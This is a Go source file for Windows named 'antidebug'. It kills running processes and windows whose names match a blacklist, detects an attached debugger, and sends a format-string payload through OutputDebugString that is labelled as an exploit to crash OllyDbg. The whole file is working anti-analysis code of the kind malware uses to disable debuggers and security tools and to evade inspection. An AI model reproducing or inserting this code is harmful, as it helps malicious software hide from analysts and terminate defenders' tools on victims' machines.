package antidebug

import (
	"strings"
	"syscall"
	"unsafe"
    "fmt"
	"github.com/shirou/gopsutil/v3/process"
)

func terminateProcess(pid uint32) error {
	handle, _, _ := ProcOpenProcess.Call(syscall.PROCESS_TERMINATE, 0, uintptr(pid))
	if handle == 0 {
		return fmt.Errorf("failed to open process")
	}
	defer syscall.CloseHandle(syscall.Handle(handle))

	ret, _, _ := ProcTerminateProcess.Call(handle, 0)
	if ret == 0 {
		return fmt.Errorf("failed to terminate process")
	}
	return nil
}

func contains(slice []string, str string) bool {
	str = strings.ToLower(str)
	for _, s := range slice {
		if strings.Contains(str, s) {
			return true
		}
	}
	return false


}

func KillProcessesByNames(blacklist []string) error {
	processes, _ := process.Processes()

	for _, p := range processes {
		processName, _ := p.Name()
		if contains(blacklist, processName) {
			terminateProcess(uint32(p.Pid))
		}
	}
	return nil
}

func getCallback(blacklist []string) uintptr {
	return syscall.NewCallback(func(hwnd syscall.Handle, lparam uintptr) uintptr {
		var title [256]byte
		GetWindowText.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&title)), uintptr(len(title)))

		titleStr := string(title[:])
		if titleStr == "" {
			return 1
		}

		if contains(blacklist, titleStr) {
			var pid uint32
			GetWindowThread.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&pid)))
			terminateProcess(pid)
		}
		return 1
	})
}

func KillProcessesByWindowsNames(callback uintptr) error {
	EnumWindowsProc.Call(callback, 0)
	return nil
}

func IsDebuggerPresent() bool {
	flag, _, _ := IsDebugger.Call()
	return flag != 0
}

func OutputDebugStringAntiDebug() {
	DebugString.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("hm"))))
}

func OutputDebugStringOllyDbgExploit() {
	DebugString.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s"))))
}